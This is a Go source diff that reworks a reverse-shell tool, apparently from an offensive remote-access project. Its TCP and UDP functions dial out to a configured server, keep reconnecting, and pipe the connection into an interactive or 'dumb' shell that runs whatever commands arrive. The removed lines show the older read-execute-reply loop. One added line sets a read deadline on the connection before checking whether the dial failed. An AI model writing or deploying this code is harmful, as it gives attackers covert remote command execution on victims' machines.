@@ -2,7 +2,7 @@ package main
 
 import (
 	"net"
-	"bufio"
+	"runtime"
 	"time"
 )
 
@@ -14,18 +14,13 @@ func TCPReverseShell(config Config) {
 		}
 
 		TCPReconnect(config)
+		return
 	}
 
-	reader := bufio.NewReader(conn)
-	for {
-		stdin, err := reader.ReadBytes('\n')
-		if err != nil {
-			conn.Close()
-			return
-		}
-
-		output := Shell(config.Shell, stdin)
-		conn.Write(output)
+	if runtime.GOOS != "windows" {
+		InteractiveShell(config.Shell, conn)
+	} else {
+		DumbShell(config.Shell, conn)
 	}
 
 	TCPReconnect(config)
@@ -48,6 +43,7 @@ func UDPReverseShell(config Config) {
 	}
 
 	conn, err := net.DialUDP("udp", LocalAddr, ServerAddr)
+	conn.SetReadDeadline((time.Now()).Add(config.Reconnect)) // timeout then reconnect
 	if err != nil {
 		if conn != nil {
 			conn.Close()
@@ -56,22 +52,7 @@ func UDPReverseShell(config Config) {
 		UDPReconnect(config)
 	}
 
-	reader := bufio.NewReader(conn)
-	for {
-		conn.Write([]byte("> "))
-
-		conn.SetReadDeadline((time.Now()).Add(config.Reconnect)) // timeout then reconnect
-		stdin, err := reader.ReadBytes('\n')
-		if err != nil {
-			conn.Write([]byte("Reconnecting...\n"))
-			conn.Close()
-			break
-		}
-
-		output := Shell(config.Shell, stdin)
-		conn.Write(output)
-	}
-	
+	DumbShell(config.Shell, conn)
 	UDPReconnect(config)
 }
 
